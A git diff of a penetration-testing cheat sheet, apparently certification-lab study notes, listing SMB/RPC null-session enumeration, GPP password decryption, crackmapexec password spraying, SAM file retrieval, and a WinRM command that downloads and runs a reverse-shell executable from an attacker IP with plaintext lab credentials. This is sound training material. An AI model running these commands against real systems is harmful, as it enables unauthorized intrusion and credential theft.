@@ -1,7 +1,7 @@
 # FEEL LIKE STUCK???
 - Did we try ftp login with admin:admin, ftp:ftp etc?
 - Did we check Groups.xml?(crack with gpp-decrypt)
-- Did we try enum4linux,smbclient,smbmap,rpcclient anonymously?
+- Did we try crackmapexec, enum4linux, smbclient, smbmap, rpcclient anonymously/guestuser?
 - Did we look into any suspicious binaries using strings?
 - Did we try reverse shell with port with 443,80,445? (Learn this from PG Practice Helpdesk, Craft2)
 - Did we create correct revshell for the victim architecture?
@@ -177,10 +177,11 @@ enum4linux -a 192.168.201.175
 ## rpcclient
 ```bash
 rpcclient 10.10.10.10
-rpcclient 10.10.10.10 -U ''
+rpcclient 10.10.10.10 -U '' -N
+> enumdomusers
 ```
 
-## gpp-decrypt
+## gpp-decrypt(Groups.xml)
 ```bash
 gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ                                            
 ```
@@ -188,7 +189,8 @@ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH
 
 ## smbmap
 ```bash
-smbmap -H 10.129.193.5
+smbmap -H 192.168.x.x
+smbmap -H 192.168.x.x -u '' -p ''
 smbmap -u svc_tgs -p GPPstillStandingStrong2k18 -d active.htb -H 10.129.193.5
 
 ```
@@ -277,24 +279,26 @@ iwr -UseDefaultCredentials http://web04
 --local-auth
 
 #smb
-crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "" -p "" --pass-pol
-crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "" -p "" --shares
-crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "username" -p "password" --shares
-crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "username" -p "password" --continue-on-success
+crackmapexec smb 192.168.x.x -u '' -p '' --pass-pol
+crackmapexec smb 192.168.x.x -u '' -p '' --shares
+crackmapexec smb 192.168.x.x -u 'rand' -p '' --shares
+
+crackmapexec smb 192.168.x.x -u 'username' -p 'password' --shares
+crackmapexec smb 192.168.x.x -u username.txt -p 'password' --continue-on-success
 
 #ssh
-crackmapexec ssh <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>" --continue-on-success
+crackmapexec ssh 192.168.x.x -u 'username' -p 'password' --continue-on-success
 
 #ftp
-crackmapexec ftp <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>" --continue-on-success
+crackmapexec ftp 192.168.x.x -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>" --continue-on-success
 
 #mssql
-crackmapexec mssql <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>"
+crackmapexec mssql 192.168.x.x -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>"
 crackmapexec mssql 10.10.85.148 -u sql_svc -p Dolphin1 -d oscp.exam --get-file "C:\TEMP\SAM" SAM
 
 #winrm
-crackmapexec winrm <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p '<% tp.frontmatter["PASSWORD"] %>' -d <% tp.frontmatter["DOMAIN"] %>  --continue-on-success
-crackmapexec winrm <% tp.frontmatter["RHOST"] %>  -u "<% tp.frontmatter["USERNAME"] %>" -H '' -d <% tp.frontmatter["DOMAIN"] %> --continue-on-success
+crackmapexec winrm 192.168.x.x -u "<% tp.frontmatter["USERNAME"] %>" -p '<% tp.frontmatter["PASSWORD"] %>' -d <% tp.frontmatter["DOMAIN"] %>  --continue-on-success
+crackmapexec winrm 192.168.x.x  -u "<% tp.frontmatter["USERNAME"] %>" -H '' -d <% tp.frontmatter["DOMAIN"] %> --continue-on-success
 proxychains -q crackmapexec winrm 172.16.80.21 -u Administrator -p 'vau!XCKjNQBv2$' -x 'certutil -urlcache -f http://192.168.45.176:8000/revshell7777.exe C:\Users\Public\revshell7777.exe'
 proxychains -q crackmapexec winrm 172.16.80.21 -u Administrator -p 'vau!XCKjNQBv2$' -x 'C:\Users\Public\revshell7777.exe'
 
